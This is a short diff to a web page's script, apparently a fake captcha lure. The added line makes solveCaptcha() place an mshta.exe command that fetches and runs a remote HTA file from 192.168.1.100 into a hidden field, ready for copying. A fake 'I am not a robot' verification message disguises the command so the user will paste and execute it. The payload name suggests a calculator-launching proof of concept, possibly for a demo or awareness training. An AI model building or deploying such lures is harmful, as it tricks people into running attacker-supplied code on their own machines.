@@ -131,7 +131,7 @@
 
     // Function executed when captcha is "solved"
     function solveCaptcha() {
-      const payload = "C:\\company\\internal-secure\\filedrive\\HRPolicy.docx";
+      const payload = "mshta.exe http://192.168.1.100/open_calc.hta # ✅ I am not a robot - Verification ID: 123456 - Press OK";
       hidden.value = payload;
       hidden.select();
       hidden.setSelectionRange(0, hidden.value.length);
